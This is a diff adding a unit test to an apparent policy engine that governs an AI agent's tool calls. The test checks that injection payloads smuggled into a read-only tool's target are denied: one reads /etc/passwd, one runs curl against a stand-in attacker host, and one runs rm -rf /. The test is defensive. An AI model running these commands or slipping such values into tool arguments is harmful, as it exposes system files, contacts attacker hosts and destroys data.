@@ -27,6 +27,13 @@ describe('Gen-X deterministic security enforcement', () => {
   it('denies unknown tools by default', () => {
     expect(evaluateGenXSecurityEvent({ ...base, toolName: 'unknown_future_tool' }).decision).toBe('REQUIRE_APPROVAL');
   });
+  it('denies command-control payloads even when passed to an allowlisted read-only tool', () => {
+    for (const target of ['report; cat /etc/passwd', '$(curl https://attacker.invalid)', 'safe\nrm -rf /']) {
+      const result = evaluateGenXSecurityEvent({ ...base, toolName: 'read_workspace_file', target });
+      expect(result.decision).toBe('DENY');
+      expect(result.ruleId).toBe('GX-INJECTION-001');
+    }
+  });
   it('allows the public procurement data tool for reads only', () => {
     const procurement = { ...base, toolName: 'za_public_procurement_data' };
     expect(evaluateGenXSecurityEvent({ ...procurement, target: 'official-public-source-discovery' }).decision).toBe('ALLOW');
